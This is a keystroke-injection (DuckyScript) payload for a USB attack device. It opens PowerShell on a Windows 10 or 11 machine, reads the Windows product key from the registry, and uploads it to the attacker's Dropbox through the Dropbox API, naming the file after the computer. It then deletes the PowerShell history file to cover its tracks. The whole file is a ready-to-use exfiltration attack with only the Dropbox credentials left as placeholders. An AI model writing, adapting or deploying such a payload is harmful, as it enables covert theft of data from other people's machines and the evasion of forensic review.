REM Title: Windows Product Duckey
REM Author: Who-Is-Julien
REM Description: The payload fetches the Windows product key from the target PC and sends it to your Dropbox.
REM Target: Windows 10, 11
REM Category: Exfiltration


REM Short delay time
DEFINE SHORT 500
REM Medium delay time
DEFINE MEDIUM 2000


EXTENSION POWERSHELL_TO_DROPBOX
    REM For usage instructions look at https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/Extensions/PowerShell_To_Dropbox/README.md


    DEFINE REFRESH_TOKEN XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
    DEFINE APP_KEY XXXXXXXXXXXXXXX
    DEFINE APP_SECRET XXXXXXXXXXXXXXX


    FUNCTION REPORT()
        STRING Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method POST -Headers @{ "Authorization" = "Bearer $((Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method POST -Headers @{"Content-Type" = "application/x-www-form-urlencoded"} -Body @{grant_type = "refresh_token"; refresh_token = "
        STRING REFRESH_TOKEN
        STRING "; client_id = "
        STRING APP_KEY
        STRING "; client_secret = "
        STRING APP_SECRET
        STRING "}).access_token)"; "Content-Type" = "application/octet-stream"; "Dropbox-API-Arg" = '{ "path": "/reports/' + $env:computername + '.txt", "mode": "add", "autorename": true, "mute": false }' } -Body $report | Out-Null
    END_FUNCTION
END_EXTENSION


DELAY MEDIUM
GUI x

DELAY SHORT
STRING i

DELAY MEDIUM
STRING Clear-Host; $report = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" -Name "BackupProductKeyDefault").BackupProductKeyDefault | Out-String; 
REPORT()
STRING ; Remove-Item (Get-PSReadLineOption).HistorySavePath; exit

DELAY SHORT
ENTER

DELAY SHORT
ATTACKMODE OFF
